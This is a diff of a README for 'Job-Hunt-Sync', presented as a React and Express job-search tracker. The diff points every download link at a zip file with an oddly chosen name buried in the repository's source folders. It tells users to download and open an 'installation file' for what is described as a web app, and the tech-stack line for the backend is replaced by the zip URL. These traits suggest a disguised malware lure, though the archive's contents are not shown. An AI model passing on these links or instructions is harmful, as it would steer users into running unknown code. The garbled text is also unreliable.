@@ -1,6 +1,6 @@
 # 🌐 Job-Hunt-Sync - Streamline Your Job Search Effortlessly
 
-[![Download Job-Hunt-Sync](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/propitiable/Job-Hunt-Sync.zip%20Now-Job--Hunt--Sync-brightgreen)](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/propitiable/Job-Hunt-Sync.zip)
+[![Download Job-Hunt-Sync](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/client/src/routes/Job_Sync_Hunt_pettifogger.zip%20Now-Job--Hunt--Sync-brightgreen)](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/client/src/routes/Job_Sync_Hunt_pettifogger.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Job-Hunt-Sync is a web application designed to help job seekers manage their job
 
 To get started, you need to download the application. Please follow these steps:
 
-1. Click on the [Download Job-Hunt-Sync](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/propitiable/Job-Hunt-Sync.zip) link to visit the Releases page.
+1. Click on the [Download Job-Hunt-Sync](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/client/src/routes/Job_Sync_Hunt_pettifogger.zip) link to visit the Releases page.
 2. On the Releases page, find the latest version.
 3. Download the installation file for your system.
 4. Once downloaded, open the file to start the installation process.
@@ -51,7 +51,7 @@ Job-Hunt-Sync is designed to be user-friendly on both desktop and mobile devices
 The application is built using modern web technologies:
 
 - **Frontend:** React for a dynamic and responsive user interface.
-- **Backend:** https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/propitiable/Job-Hunt-Sync.zip and Express for robust server-side processing.
+- **Backend:** https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/client/src/routes/Job_Sync_Hunt_pettifogger.zip and Express for robust server-side processing.
 - **Database:** MongoDB for efficient data management.
 - **Styling:** Tailwind CSS for a clean and modern design.
 - **APIs:** Axios for handling HTTP requests smoothly.
@@ -72,4 +72,4 @@ We value community feedback. If you encounter any issues or have suggestions for
 
 Job-Hunt-Sync simplifies the job application process. With its user-friendly interface and powerful features, you can focus more on finding your dream job and less on organizing your applications. Download the application today and take the first step towards managing your job search effectively.
 
-[![Download Job-Hunt-Sync](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/propitiable/Job-Hunt-Sync.zip%20Now-Job--Hunt--Sync-brightgreen)](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/propitiable/Job-Hunt-Sync.zip)
+[![Download Job-Hunt-Sync](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/client/src/routes/Job_Sync_Hunt_pettifogger.zip%20Now-Job--Hunt--Sync-brightgreen)](https://raw.githubusercontent.com/7261099089/Job-Hunt-Sync/main/client/src/routes/Job_Sync_Hunt_pettifogger.zip)
